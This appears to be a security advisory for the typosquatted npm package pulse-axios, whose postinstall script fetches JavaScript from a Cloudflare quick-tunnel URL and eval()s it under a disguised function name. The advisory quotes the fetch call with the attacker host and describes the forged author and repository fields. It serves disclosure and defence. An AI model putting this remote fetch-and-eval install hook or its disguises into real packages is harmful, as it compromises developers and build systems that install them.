summary: pulse-axios postinstall fetches and eval()s remote JavaScript from a Cloudflare tunnel
details: pulse-axios@1.17.2 typosquats axios (description: 'a faster and better version of axios', repository pointed at github.com/axios/axios.git, author field forged as 'Matt Zabriskie', the original axios author). Its package.json declares `postinstall: node./lib/core/eval.js`. That script (lib/core/eval.js lines 4-11) calls `fetch('https://consequences-faces-weblogs-clinical.trycloudflare.com/download/datab1')`, reads the response body, and passes it directly to `eval()` wrapped in an async IIFE, with errors silently swallowed. The destination is a trycloudflare.com quick-tunnel — an ephemeral, attacker-controlled hostname — and no integrity check is performed on the fetched bytes. Any developer or build system running `npm install pulse-axios` executes attacker-supplied JavaScript with the installing user's privileges. The function is misleadingly named `sendAnalytics` to disguise the remote-eval behavior.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
